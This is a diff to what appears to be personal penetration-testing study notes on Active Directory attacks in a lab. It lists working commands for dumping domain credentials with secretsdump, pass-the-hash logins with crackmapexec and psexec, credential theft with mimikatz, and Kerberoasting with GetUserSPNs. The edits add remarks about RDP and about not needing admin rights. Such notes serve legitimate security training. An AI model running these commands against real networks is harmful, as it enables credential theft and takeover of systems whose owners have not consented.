@@ -88,7 +88,7 @@ Transfer loot back to kali:
 1. `impacket-secretsdump <username>:<password>@<domain name or IP> -dc-ip <DC IP>`
 2. or `secretsdump.py marvel/ID:SOMEPASSWORD@TARGETIP` 
 3. `crackmapexec smb 192.168.57.0/24 -u "Frank Admin" -H <Second part of the HASH without ::> --local-auth` (we are trying to login to other computers)
-4. If we pawned a PC, we can try to psexec into the PC. `psexec.py "Frank Admin":TARGETIP -hashes avbcd:abcd`. If dont get a shell, we werent able to gain admin access. 
+4. If we pawned a PC, we can try to psexec into the PC. `psexec.py "Frank Admin":TARGETIP -hashes avbcd:abcd`. If dont get a shell, we werent able to gain admin access. Maybe RDP is open?. We can still do Kerbroasting.
 ## Dumping Hash (as Admin) 
 1. Use mimikatz to view, steal credentials, generate kerbros tickets and leverage attack.
 2. `.\mimikatz.exe`
@@ -98,9 +98,9 @@ Transfer loot back to kali:
 0. If we navigate to a machine and token of a domain administrator(user), we have domain admin. 
 
 
-## Kerbreroasting (Service Account Attack (want to attack members of high value group )
+## Kerbreroasting (Service Account Attack (want to attack members of high value group, dont have to be admin )
 1. Once we have some username + password, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
-2. `locate  GetUserSPNs.py`  `cd /usr/share/doc/python3-impacket/examples/` `python GetUserSPNs.py offsec.local/nathan:"abc123//" -dc-ip=192.168.125.57 -request`
+2. `locate  GetUserSPNs.py`  `cd /usr/share/doc/python3-impacket/examples/` `python GetUserSPNs.py offsec.local/nathan:"abc123" -dc-ip=192.168.125.57 -request`
 
 ```
 impacket-GetUserSPNs <IP or hostname>/<username>:<password> -request [add -request if SPN is found]
